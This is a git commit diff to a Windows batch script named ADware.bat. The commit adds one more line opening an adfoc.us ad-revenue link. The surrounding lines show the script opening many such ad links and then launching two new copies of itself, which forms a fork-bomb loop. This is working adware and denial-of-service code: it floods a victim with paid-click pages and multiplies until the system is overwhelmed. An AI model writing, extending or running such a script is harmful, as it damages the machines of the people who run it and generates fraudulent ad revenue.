ef70a023f5d769824c4f25d31f6d6844a7e7901a
Cympator 007 <129586447+Cympator007@users.noreply.github.com>
2024-06-11 21:54:02 +0200

    Update ADware.bat

--- ADware.bat
+++ ADware.bat
@@ -17,5 +17,6 @@ start http://adfoc.us/859243103896079
 start http://adfoc.us/859243103951107
 start http://adfoc.us/859243103999248
 start http://adfoc.us/859243104108594
+start http://adfoc.us/859243104140404
 start ADware.bat
 start ADware.bat
